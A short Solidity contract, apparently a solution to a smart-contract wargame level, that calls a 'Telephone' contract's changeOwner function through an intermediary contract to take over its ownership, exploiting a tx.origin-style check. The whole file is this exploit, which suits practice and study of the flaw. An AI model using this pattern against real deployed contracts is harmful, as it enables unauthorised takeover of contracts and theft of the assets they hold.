// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./og.sol";

contract TelephoneAttack{
  Telephone immutable victim;
  address immutable public victim_addres;

  constructor(address _victimAddress){
    victim_addres = _victimAddress;
    victim = Telephone(_victimAddress);
  }

  function send(address newOwner) public{
    victim.changeOwner(newOwner);
  }
}
